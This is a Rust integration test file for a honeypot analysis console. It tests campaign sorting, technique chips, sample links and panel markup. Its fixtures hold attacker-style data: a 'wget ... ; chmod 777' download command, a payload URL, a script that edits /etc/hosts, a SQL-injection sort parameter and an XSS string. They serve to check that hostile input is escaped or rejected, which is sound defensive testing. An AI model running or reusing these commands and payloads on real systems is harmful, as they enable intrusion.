            serde_json::json!({}),
            None,
        )
        .await;
        pend(&pool, ip).await;
    }
    let console = Console::new(pool.clone());
    let (_, page) = console.get("/queue").await;
    let same_day = between(&page, "id=\"row-203.0.113.90\"", "</tr>");
    assert!(
        same_day.contains(
            "title=\"first 2026-01-05 10:58 UTC, last 2026-01-05 18:11 UTC\">Jan 5, 10:58-18:11 UTC<"
        ),
        "{same_day}"
    );
    let multi_day = between(&page, "id=\"row-203.0.113.91\"", "</tr>");
    assert!(
        multi_day
            .contains("title=\"first 2026-01-01 09:00 UTC, last 2026-01-04 10:00 UTC\">3d, last "),
        "{multi_day}"
    );
    // The retired columns are gone and every sort key is still reachable. The score carries the
    // same meter it does on every other page, inside its own column.
    assert!(
        same_day.contains("<td class=\"score\"><span class=\"meter\">"),
        "{same_day}"
    );
    for gone in ["Categories", "First seen</th>", "Last seen</th>"] {
        assert!(!page.contains(gone), "{gone} should be gone: {page}");
    }
    for key in ["score", "event_count", "first_seen", "last_seen"] {
        assert!(
            page.contains(&format!("href=\"/queue?sort={key}\"")),
            "{key}"
        );
    }
}

/// A campaign row written directly, for the list tests that need a chosen shape (host count,
/// dates, class) rather than whatever the indexer made of a ledger. `label` is stored as the
/// indexer would store it, `{count}: {opening}`.
async fn insert_campaign(
    pool: &PgPool,
    kind: &str,
    label: &str,
    members: i32,
    first_hours_ago: i64,
    last_hours_ago: i64,
) -> i64 {
    let opening = label.split_once(": ").map_or(label, |(_, o)| o);
    sqlx::query_scalar(
        "INSERT INTO campaign (kind, key, label, representative, rep_event_id, first_seen, \
                               last_seen, member_count, sightings) \
         VALUES ($1, $2, $3, jsonb_build_object('opening', $4::text), 1, \
                 now() - make_interval(hours => $5::int), now() - make_interval(hours => $6::int), \
                 $7, $7) RETURNING id",
    )
    .bind(kind)
    .bind(format!("key-{label}"))
    .bind(label)
    .bind(opening)
    .bind(first_hours_ago as i32)
    .bind(last_hours_ago as i32)
    .bind(members)
    .fetch_one(pool)
    .await
    .unwrap()
}

fn position(page: &str, needle: &str) -> usize {
    page.find(needle)
        .unwrap_or_else(|| panic!("`{needle}` not in page: {page}"))
}

#[sqlx::test(migrations = false)]
async fn the_list_sorts_by_hosts_by_default_and_by_dates_on_request(pool: PgPool) {
    migrate(&pool).await;
    // (hosts, first seen, last seen) in hours ago: every sort key gives a different order.
    for (name, hosts, first, last) in [
        ("aaa", 2, 3, 1),
        ("bbb", 5, 60, 50),
        ("ccc", 5, 20, 5),
        ("ddd", 3, 100, 2),
    ] {
        insert_campaign(
            &pool,
            "command_sequence",
            &format!("4 commands: {name}"),
            hosts,
            first,
            last,
        )
        .await;
    }
    let console = Console::new(pool.clone());
    let order = |page: &str| -> Vec<&'static str> {
        let mut seen: Vec<(usize, &'static str)> = ["aaa", "bbb", "ccc", "ddd"]
            .iter()
            .map(|n| (position(page, &format!(">{n}</a>")), *n))
            .collect();
        seen.sort();
        seen.into_iter().map(|(_, n)| n).collect()
    };
    let (_, page) = console.get("/campaigns").await;
    assert_eq!(
        order(&page),
        ["ccc", "bbb", "ddd", "aaa"],
        "hosts, then last seen"
    );
    assert!(
        page.contains("<a href=\"/campaigns?sort=hosts\" class=\"active\">hosts</a>"),
        "{page}"
    );
    let (_, page) = console.get("/campaigns?sort=last_seen").await;
    assert_eq!(order(&page), ["aaa", "ddd", "ccc", "bbb"]);
    let (_, page) = console.get("/campaigns?sort=first_seen").await;
    assert_eq!(order(&page), ["aaa", "ccc", "bbb", "ddd"]);
    // An unknown key falls back to hosts rather than reaching the query.
    let (status, page) = console
        .get("/campaigns?sort=1%3BDROP%20TABLE%20campaign")
        .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(order(&page), ["ccc", "bbb", "ddd", "aaa"]);
}

#[sqlx::test(migrations = false)]
async fn single_host_groups_are_hidden_until_the_toggle_is_used(pool: PgPool) {
    migrate(&pool).await;
    insert_campaign(&pool, "command_sequence", "4 commands: multi one", 4, 5, 1).await;
    insert_campaign(&pool, "command_sequence", "4 commands: lonely one", 1, 5, 1).await;
    insert_campaign(&pool, "command_sequence", "4 commands: lonely two", 1, 6, 2).await;
    insert_campaign(&pool, "scanner", "multi-service scan: lonely scan", 1, 6, 2).await;
    let console = Console::new(pool.clone());

    let (_, page) = console.get("/campaigns").await;
    assert!(page.contains(">multi one</a>"), "{page}");
    assert!(
        !page.contains("lonely"),
        "single-host groups are hidden by default: {page}"
    );
    assert!(
        page.contains("Campaigns <span class=\"dim\">(1)</span>"),
        "{page}"
    );
    assert!(
        page.contains(">show single-host groups (3)</a>"),
        "the toggle counts what it hides: {page}"
    );
    assert!(
        page.contains("href=\"/campaigns?sort=hosts&amp;single=1\""),
        "{page}"
    );

    let (_, page) = console.get("/campaigns?single=1").await;
    for name in ["multi one", "lonely one", "lonely two", "lonely scan"] {
        assert!(page.contains(&format!(">{name}</a>")), "{name}: {page}");
    }
    assert!(
        page.contains("Campaigns <span class=\"dim\">(4)</span>"),
        "{page}"
    );
    assert!(page.contains(">single-host groups shown</a>"), "{page}");
    // The tabs and the sort links keep the choice.
    assert!(
        page.contains("href=\"/campaigns?kind=scan&amp;sort=hosts&amp;single=1\""),
        "{page}"
    );

    // The count follows the tab: one hidden group among the scans.
    let (_, page) = console.get("/campaigns?kind=scan").await;
    assert!(page.contains(">show single-host groups (1)</a>"), "{page}");
    assert!(
        page.contains("no campaigns of this kind with more than one host yet"),
        "{page}"
    );
    let (_, page) = console.get("/campaigns?kind=scan&single=1").await;
    assert!(page.contains(">lonely scan</a>"), "{page}");
}

#[sqlx::test(migrations = false)]
async fn the_same_sample_kind_is_not_listed_but_its_pages_and_links_still_work(pool: PgPool) {
    migrate(&pool).await;
    let sha = seed(&pool, b"#!/bin/sh\necho kept off the list\n").await;
    for ip in ["192.0.2.1", "192.0.2.2"] {
        pend(&pool, ip).await;
    }
    let sample = campaign_id(&pool, "sample").await;
    let console = Console::new(pool.clone());

    for uri in [
        "/campaigns",
        "/campaigns?single=1",
        "/campaigns?kind=sample",
        "/campaigns?kind=behaviour",
    ] {
        let (status, page) = console.get(uri).await;
        assert_eq!(status, StatusCode::OK, "{uri}");
        assert!(
            !page.contains(&format!("href=\"/campaigns/{sample}\"")),
            "{uri} lists the same-sample campaign: {page}"
        );
        assert!(!page.contains("same sample"), "{uri}: {page}");
    }
    // Its own page, its approval, the queue's group link and the Samples page still resolve.
    let (status, detail) = console.get(&format!("/campaigns/{sample}")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(detail.contains("same sample campaign"), "{detail}");
    let (status, _) = console.get(&format!("/campaigns/{sample}/approve")).await;
    assert_eq!(status, StatusCode::OK);
    let (_, queue) = console.get("/queue").await;
    let link = format!("<a href=\"/campaigns/{sample}\">campaign {sample}</a>");
    assert!(queue.contains(&link), "{queue}");
    let (status, _) = console.get(&format!("/samples/{sha}")).await;
    assert_eq!(status, StatusCode::OK);
}

#[sqlx::test(migrations = false)]
async fn labels_split_into_commands_and_range_and_each_class_has_its_tab(pool: PgPool) {
    migrate(&pool).await;
    let cmd = insert_campaign(
        &pool,
        "command_sequence",
        "4-16 commands: wget http://<ip>/x ; chmod 777 x",
        3,
        5,
        1,
    )
    .await;
    let http = insert_campaign(
        &pool,
        "command_sequence",
        "6 commands: http request sent to a shell port",
        3,
        5,
        1,
    )
    .await;
    let login = insert_campaign(
        &pool,
        "command_sequence",
        "5-8 commands: shell entry only",
        3,
        5,
        1,
    )
    .await;
    let scan = insert_campaign(
        &pool,
        "scanner",
        "multi-service scan: ssh, telnet, mqtt",
        3,
        5,
        1,
    )
    .await;
    let console = Console::new(pool.clone());

    let (_, page) = console.get("/campaigns").await;
    let row = between(&page, &format!("href=\"/campaigns/{cmd}\""), "</tr>");
    assert!(
        row.contains(">wget http://&lt;ip&gt;/x ; chmod 777 x</a>"),
        "{row}"
    );
    assert!(
        row.contains("<span class=\"dim\">4-16 commands</span>"),
        "{row}"
    );
    assert!(
        !row.contains("4-16 commands:"),
        "the range is secondary text, not a prefix: {row}"
    );
    assert!(
        row.contains("title=\"wget http://&lt;ip&gt;/x ; chmod 777 x\""),
        "full text in the title: {row}"
    );
    assert!(row.contains("<span class=\"sev\">commands</span>"), "{row}");
    let scan_row = between(&page, &format!("href=\"/campaigns/{scan}\""), "</tr>");
    assert!(scan_row.contains(">ssh, telnet, mqtt</a>"), "{scan_row}");
    assert!(!scan_row.contains("commands</span>"), "{scan_row}");

    for (kind, only, others) in [
        ("behaviour", cmd, [http, login, scan]),
        ("http", http, [cmd, login, scan]),
        ("login", login, [cmd, http, scan]),
        ("scan", scan, [cmd, http, login]),
    ] {
        let (_, page) = console.get(&format!("/campaigns?kind={kind}")).await;
        assert!(
            page.contains(&format!("href=\"/campaigns/{only}\"")),
            "{kind}: {page}"
        );
        for other in others {
            assert!(
                !page.contains(&format!("href=\"/campaigns/{other}\"")),
                "{kind} lists {other}: {page}"
            );
        }
    }
}

#[sqlx::test(migrations = false)]
async fn delivers_shows_the_sample_count_and_the_first_sample(pool: PgPool) {
    migrate(&pool).await;
    let sha = seed(&pool, b"#!/bin/sh\necho one sample\n").await;
    let sequence = campaign_id(&pool, "command_sequence").await;
    let console = Console::new(pool.clone());
    let (_, page) = console.get("/campaigns").await;
    let row = between(&page, &format!("href=\"/campaigns/{sequence}\""), "</tr>");
    assert!(row.contains(&format!("href=\"/samples/{sha}\"")), "{row}");
    assert!(
        row.contains(&format!(">{}&hellip;</a>", &sha[..12])),
        "{row}"
    );
    assert!(!row.contains("more</span>"), "one sample, no count: {row}");

    // Two more linked samples: the first (by digest) is named, the rest are counted.
    for filler in ['f', 'e'] {
        sqlx::query("INSERT INTO campaign_sample (campaign_id, sha256) VALUES ($1, $2)")
            .bind(sequence)
            .bind(filler.to_string().repeat(64))
            .execute(&pool)
            .await
            .unwrap();
    }
    let (_, page) = console.get("/campaigns").await;
    let row = between(&page, &format!("href=\"/campaigns/{sequence}\""), "</tr>");
    assert!(row.contains("+2 more</span>"), "{row}");
    assert_eq!(
        row.matches("href=\"/samples/").count(),
        1,
        "one link, not a row of hashes: {row}"
    );
}

#[sqlx::test(migrations = false)]
async fn the_ip_page_names_a_sample_captured_through_another_address_report(pool: PgPool) {
    migrate(&pool).await;
    let url = "http://203.0.113.91/dl/payload.bin";
    let body = b"fetched payload";
    let digest = Sha256::digest(body).to_vec();
    let sha: String = digest.iter().map(|b| format!("{b:02x}")).collect();
    for (ip, hours) in [("192.0.2.31", 26), ("192.0.2.32", 5)] {
        append(
            &pool,
            ip,
            "ssh",
            SignalType::HoneypotFileDownload,
            Utc::now() - Duration::hours(hours),
            serde_json::json!({ "url": url }),
            Some(Uuid::now_v7()),
        )
        .await;
    }
    append(
        &pool,
        "192.0.2.33",
        "ssh",
        SignalType::HoneypotConnection,
        Utc::now(),
        serde_json::json!({}),
        None,
    )
    .await;
    sqlx::query(
        "INSERT INTO fetch_attempt (url_hash, url, host, scheme, source_ip, status, sha256, bytes, \
                                    last_attempt) \
         VALUES ($1, $2, '203.0.113.91', 'http', '192.0.2.31'::inet, 'success', $3, 15, now())",
    )
    .bind(Sha256::digest(url.as_bytes()).to_vec())
    .bind(url)
    .bind(&digest)
    .execute(&pool)
    .await
    .unwrap();
    let console = Console::new(pool.clone());

    // The first reporter owns the capture: the panel lists it and says nothing extra.
    let (_, first) = console.get("/ip/192.0.2.31").await;
    assert!(
        !first.contains("first reported by another address"),
        "{first}"
    );
    assert!(
        !first.contains("no samples linked to this address"),
        "{first}"
    );
    // The later reporter's panel must not claim there is nothing while the URL table shows it.
    let (_, later) = console.get("/ip/192.0.2.32").await;
    assert!(
        later.contains("1 sample via a URL first reported by another address"),
        "{later}"
    );
    assert!(
        later.contains(&format!("href=\"/samples/{sha}\"")),
        "{later}"
    );
    assert!(
        !later.contains("no samples linked to this address"),
        "{later}"
    );
    // An address with no download at all still says so.
    let (_, none) = console.get("/ip/192.0.2.33").await;
    assert!(none.contains("no samples linked to this address"), "{none}");
    assert!(
        !none.contains("first reported by another address"),
        "{none}"
    );
}

/// The ATT&CK panel, session chips and campaign chips, from tags the real indexer wrote: a sample
/// upload tags T1105 on the uploading session, its source and the campaigns that session joined.
#[sqlx::test(migrations = false)]
async fn indexer_written_techniques_show_on_the_ip_page_and_both_campaign_pages(pool: PgPool) {
    migrate(&pool).await;
    let sha = seed(&pool, b"#!/bin/sh\necho tagged\n").await;
    let console = Console::new(pool.clone());

    let (_, ip) = console.get("/ip/192.0.2.1").await;
    let panel = between(&ip, "ATT&amp;CK techniques", "Network profile");
    assert!(
        panel.contains(
            r#"<span class="sev" title="ATT&amp;CK v19.2">T1105</span> Ingress Tool Transfer"#
        ) && panel.contains("upload-sample")
            && panel.contains(&sha),
        "{panel}"
    );
    // The session that ran commands and uploaded carries the chip in its card header.
    let header = between(&ip, r#"<summary class="session-header">"#, "</summary>");
    assert!(
        header.contains(
            r#"<span class="sev" title="Ingress Tool Transfer, ATT&amp;CK v19.2">T1105</span>"#
        ),
        "{header}"
    );

    let sample = campaign_id(&pool, "sample").await;
    let (_, page) = console.get(&format!("/campaigns/{sample}")).await;
    let panel = between(&page, "ATT&amp;CK techniques", "Linked samples");
    assert!(
        panel.contains("T1105") && panel.contains("Ingress Tool Transfer"),
        "{panel}"
    );
}

/// An address and a campaign with no tags say so instead of showing an empty panel; the list rows
/// carry chips only for campaigns that have tags.
#[sqlx::test(migrations = false)]
async fn untagged_pages_say_so_and_list_rows_show_chips_only_when_tagged(pool: PgPool) {
    migrate(&pool).await;
    let tagged = insert_campaign(
        &pool,
        "command_sequence",
        "2: wget http://198.51.100.9/x",
        3,
        5,
        1,
    )
    .await;
    let plain = insert_campaign(&pool, "command_sequence", "2: uname", 2, 5, 1).await;
    for (rule, technique) in [("download-command", "T1105"), ("unix-shell", "T1059.004")] {
        sqlx::query(
            "INSERT INTO campaign_attack_tag (campaign_id, technique_id, rule_id, event_id, matched) \
             VALUES ($1, $2, $3, 7, 'wget')",
        )
        .bind(tagged)
        .bind(technique)
        .bind(rule)
        .execute(&pool)
        .await
        .unwrap();
    }
    let console = Console::new(pool.clone());

    let (_, list) = console.get("/campaigns").await;
    let row_of = |id: i64| {
        let at = position(&list, &format!("href=\"/campaigns/{id}\""));
        let end = at + list[at..].find("</tr>").unwrap();
        list[at..end].to_string()
    };
    let t = row_of(tagged);
    assert!(
        t.contains(
            r#"<span class="sev" title="Ingress Tool Transfer, ATT&amp;CK v19.2">T1105</span>"#
        ) && t.contains("T1059.004"),
        "{t}"
    );
    assert!(
        // The class chip (`commands`) is a `.sev` too; technique chips are the ones with a title.
        !row_of(plain).contains("class=\"sev\" title="),
        "{}",
        row_of(plain)
    );

    let (_, none) = console.get(&format!("/campaigns/{plain}")).await;
    assert!(
        between(&none, "ATT&amp;CK techniques", "Linked samples").contains("none tagged"),
        "{none}"
    );
    let (_, quiet) = {
        scored_ip(&pool, "192.0.2.77").await;
        console.get("/ip/192.0.2.77").await
    };
    assert!(
        between(&quiet, "ATT&amp;CK techniques", "Network profile").contains("none tagged"),
        "{quiet}"
    );
}

/// A campaign with more techniques than fit shows the first four chips (by technique id) and a
/// count of the rest, so a row stays one line of chips.
#[sqlx::test(migrations = false)]
async fn a_list_row_shows_four_chips_and_counts_the_rest(pool: PgPool) {
    migrate(&pool).await;
    let id = insert_campaign(&pool, "command_sequence", "2: busy", 3, 5, 1).await;
    for (rule, technique) in [
        ("system-info", "T1082"),
        ("file-discovery", "T1083"),
        ("process-discovery", "T1057"),
        ("unix-shell", "T1059.004"),
        ("download-command", "T1105"),
        ("cron-install", "T1053.003"),
    ] {
        sqlx::query(
            "INSERT INTO campaign_attack_tag (campaign_id, technique_id, rule_id, event_id, matched) \
             VALUES ($1, $2, $3, 1, 'x')",
        )
        .bind(id)
        .bind(technique)
        .bind(rule)
        .execute(&pool)
        .await
        .unwrap();
    }
    let console = Console::new(pool.clone());
    let (_, list) = console.get("/campaigns").await;
    let at = position(&list, &format!("href=\"/campaigns/{id}\""));
    let row = &list[at..at + list[at..].find("</tr>").unwrap()];
    assert_eq!(row.matches("class=\"sev\" title=").count(), 4, "{row}");
    assert!(row.contains("<span class=\"dim\">+2</span>"), "{row}");
    // Ordered by technique id: T1053.003, T1057, T1059.004, T1082 are the four; T1083, T1105 wait.
    assert!(
        row.contains("T1053.003") && row.contains("T1082") && !row.contains("T1105"),
        "{row}"
    );
}

/// Every session on the page gets its chips, however many there are: the tags come from one
/// batched read, not a capped number of per-session reads.
#[sqlx::test(migrations = false)]
async fn every_session_card_shows_its_chips_however_many_sessions_there_are(pool: PgPool) {
    migrate(&pool).await;
    let ip = "192.0.2.90";
    for i in 0..60 {
        let session = Uuid::now_v7();
        append(
            &pool,
            ip,
            "ssh",
            SignalType::HoneypotCommandExec,
            Utc::now() - Duration::minutes(100 - i),
            serde_json::json!({ "command": format!("uname -{i}") }),
            Some(session),
        )
        .await;
        sqlx::query(
            "INSERT INTO attack_tag (source_ip, session_id, technique_id, rule_id, event_id, matched, \
                                     first_seen, last_seen) \
             VALUES ($1::inet, $2, 'T1059.004', 'unix-shell', 1, 'sh', now(), now())",
        )
        .bind(ip)
        .bind(session)
        .execute(&pool)
        .await
        .unwrap();
    }
    let console = Console::new(pool.clone());
    let (_, page) = console.get(&format!("/ip/{ip}")).await;
    let headers = page.matches(r#"<summary class="session-header">"#).count();
    let chipped = between(&page, "Evidence timeline", "</body>")
        .matches(">T1059.004</span>")
        .count();
    assert_eq!(headers, 60, "all sessions are cards");
    assert_eq!(chipped, 60, "every card carries its chip");
}

/// What matched is attacker data: rendered as escaped text, in the panel and (as a title) never
/// able to break out of an attribute.
#[sqlx::test(migrations = false)]
async fn the_matched_token_is_escaped_on_the_ip_and_campaign_pages(pool: PgPool) {
    migrate(&pool).await;
    let evil = r#"</code><script>alert("x")</script>"#;
    scored_ip(&pool, "192.0.2.78").await;
    sqlx::query(
        "INSERT INTO attack_tag (source_ip, session_id, technique_id, rule_id, event_id, matched, \
                                 first_seen, last_seen) \
         VALUES ('192.0.2.78', NULL, 'T1105', 'download-event', 3, $1, now(), now())",
    )
    .bind(evil)
    .execute(&pool)
    .await
    .unwrap();
    let id = insert_campaign(&pool, "command_sequence", "2: x", 2, 5, 1).await;
    sqlx::query(
        "INSERT INTO campaign_attack_tag (campaign_id, technique_id, rule_id, event_id, matched) \
         VALUES ($1, 'T1105', 'download-event', 3, $2)",
    )
    .bind(id)
    .bind(evil)
    .execute(&pool)
    .await
    .unwrap();
    let console = Console::new(pool.clone());
    for uri in ["/ip/192.0.2.78".to_string(), format!("/campaigns/{id}")] {
        let (_, page) = console.get(&uri).await;
        assert!(!page.contains("<script>alert"), "{uri}: {page}");
        assert!(
            page.contains("&lt;&#x2f;code&gt;&lt;script&gt;")
                || page.contains("&lt;/code&gt;&lt;script&gt;"),
            "{uri}: {page}"
        );
    }
}

async fn scored_ip(pool: &PgPool, ip: &str) {
    append(
        pool,
        ip,
        "ssh",
        SignalType::HoneypotLoginAttempt,
        Utc::now() - Duration::minutes(10),
        serde_json::json!({ "username": "root" }),
        None,
    )
    .await;
}

/// The check itself: it must flag what it is for and pass what the system allows, or a green
/// page check means nothing.
#[test]
fn the_panel_check_flags_flush_content_and_passes_the_padded_parts() {
    let ok = r#"<div class="panel"><div class="panel-head">T <span class="dim">s</span></div>
        <table class="table-compact"><tr><td>1</td></tr></table>
        <div class="panel-body"><p>text</p><ul><li>x</li></ul></div>
        <div id="load-more-container"></div></div>
        <div class="panel"><div class="panel-head">E</div><p class="empty-line">none</p></div>
        <p class="dim">outside any panel</p>"#;
    assert_eq!(markup::panel_violations(ok), Vec::<String>::new());
    for bad in [
        r#"<div class="panel"><div class="panel-head">T</div><p class="dim">none</p></div>"#,
        r#"<div class="panel"><ul class="campaign-refs"><li>x</li></ul></div>"#,
        r#"<div class="panel"><div class="stat-row"></div></div>"#,
        r#"<div class="panel"><svg class="spark"></svg></div>"#,
        r#"<div class="panel">loose words</div>"#,
        r#"<p class="empty-line">nothing here</p>"#,
        r#"<p class="empty mt-15">No vendor submissions.</p>"#,
    ] {
        assert_eq!(markup::panel_violations(bad).len(), 1, "{bad}");
    }
    let ok = r#"<span class="state-pill state-approved">approved</span>
        <span class="tier tier-standard">Standard</span><span class="sev">commands</span>"#;
    assert_eq!(markup::vocabulary_violations(ok), Vec::<String>::new());
    for bad in [
        r#"<span class="state-pill state-rejected">No</span>"#,
        r#"<a class="state-pill state-snoozed" href="/vt">pending VT analysis</a>"#,
        r#"<td class="score score--aggressive">97.0</td>"#,
        r#"<svg class="spark" role="img"><rect height="4"></rect></svg>"#,
        r#"<span class="tier-aggressive">aggressive</span>"#,
        r#"<span class="rule rule--commands">commands</span>"#,
        r#"<a class="filter-toggle on" href="/x">shown</a>"#,
        r#"<span class="qg-count">3 pending</span>"#,
    ] {
        assert_eq!(markup::vocabulary_violations(bad).len(), 1, "{bad}");
    }
}

/// Every page the console serves, rendered from one database the real indexer filled, keeps the
/// panel contract (nothing sits flush against a panel's border) and the chip vocabulary (each
/// chip used only for its own job). Each page was right when the
/// original design shipped; the pages added later broke it one panel at a time, so the check runs
/// on all of them together rather than page by page.
#[sqlx::test(migrations = false)]
async fn every_page_keeps_the_panel_contract(pool: PgPool) {
    migrate(&pool).await;
    let root = tempfile::tempdir().unwrap();
    // SAFETY: set before anything reads it, and nothing else in this binary reads the environment.
    unsafe { std::env::set_var("PROPOLIS_SPOOL_ROOT", root.path()) };
    let body = b"#!/bin/sh\necho \"127.0.0.1 rival.example.net\" >> /etc/hosts\n";
    let sha = seed(&pool, body).await;
    std::fs::create_dir_all(root.path().join("ssh")).unwrap();
    std::fs::write(root.path().join("ssh").join(&sha), body).unwrap();
    campaign::scan_artifacts(&pool, &[("ssh", root.path().join("ssh"))])
        .await
        .unwrap();
    for ip in ["192.0.2.1", "192.0.2.2", "192.0.2.4"] {
        pend(&pool, ip).await;
    }
    scored_ip(&pool, "198.51.100.9").await;
    sqlx::query(
        "INSERT INTO fetch_attempt (url_hash, url, host, scheme, status, last_attempt) \
         VALUES ($1, 'http://198.51.100.70/w.sh', '198.51.100.70', 'http', 'dead', now())",
    )
    .bind(b"panel-contract-fetch".to_vec())
    .execute(&pool)
    .await
    .unwrap();
    let sample = campaign_id(&pool, "sample").await;
    let sequence = campaign_id(&pool, "command_sequence").await;
    let console = Console::new(pool.clone());
    let (_, queue) = console.get("/queue").await;
    let token = row_csrf(&queue, "192.0.2.4");
    console
        .post(
            "/queue/192.0.2.4/approve",
            &[("csrf_token", &token), ("notes", "")],
        )
        .await;

    for uri in [
        "/".to_string(),
        "/queue".to_string(),
        "/queue?tab=approved".to_string(),
        "/queue?tab=snoozed".to_string(),
        "/queue?tab=rejected".to_string(),
        "/campaigns?kind=scan".to_string(),
        "/ips".to_string(),
        "/ip/192.0.2.1".to_string(),
        "/ip/198.51.100.200".to_string(),
        "/campaigns".to_string(),
        format!("/campaigns/{sample}"),
        format!("/campaigns/{sequence}"),
        format!("/campaigns/{sample}/approve"),
        "/samples".to_string(),
        format!("/samples/{sha}"),
        "/search/events?q=uname".to_string(),
        "/search/events?q=no-such-text".to_string(),
        "/search/events".to_string(),
        "/search/ips?sensor=ssh".to_string(),
        "/feed".to_string(),
        "/feed?tab=entries".to_string(),
        "/fleet".to_string(),
        "/logs".to_string(),
        "/integrity".to_string(),
    ] {
        let (status, page) = console.get(&uri).await;
        assert_eq!(status, StatusCode::OK, "{uri}");
        let mut found = markup::panel_violations(&page);
        found.extend(markup::vocabulary_violations(&page));
        assert!(found.is_empty(), "{uri}:\n{}", found.join("\n"));
    }
}
